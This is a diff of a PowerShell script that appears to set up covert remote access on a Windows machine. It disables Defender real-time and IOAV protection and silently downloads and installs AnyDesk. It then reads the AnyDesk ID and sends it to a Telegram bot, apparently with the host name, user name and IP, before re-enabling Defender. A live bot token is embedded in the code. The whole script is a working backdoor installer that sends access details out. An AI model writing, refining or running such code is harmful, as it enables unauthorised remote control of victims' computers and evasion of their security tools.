@@ -1,17 +1,22 @@
 # Disable Defender Temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
 
-# Install AnyDesk Silently
-$anydeskUrl = "https://download.anydesk.com/AnyDesk.exe"
-$anydeskPath = "$env:TEMP\AnyDesk.exe"
-(New-Object System.Net.WebClient).DownloadFile($anydeskUrl, $anydeskPath)
-Start-Process -FilePath $anydeskPath -ArgumentList "--silent --install" -Wait
+# Install AnyDesk (NEW METHOD)
+Start-Process -FilePath "powershell" -ArgumentList {
+    $anydeskUrl = "https://download.anydesk.com/AnyDesk.exe"
+    $anydeskPath = "$env:TEMP\AnyDesk.exe"
+    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskPath
+    Start-Process -FilePath $anydeskPath -ArgumentList "--silent --install" -Wait
+} -Wait
 
 # Get AnyDesk ID
-Start-Sleep -Seconds 10
-$anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id
+Start-Sleep -Seconds 15
+try {
+    $anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id
+} catch {
+    $anydeskId = "NOT_FOUND"
+}
 
 # Send Telegram Alert
 $BOT_TOKEN = "8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw"
@@ -27,7 +32,6 @@ Invoke-WebRequest -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_
 # Create Log File
 "$time - $computerName - $userName - $ipAddress - AnyDesk: $anydeskId" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append
 
-# Re-enable Defender (Optional)
-Start-Sleep -Seconds 30
+# Re-enable Defender
 Set-MpPreference -DisableRealtimeMonitoring $false
 Set-MpPreference -DisableIOAVProtection $false
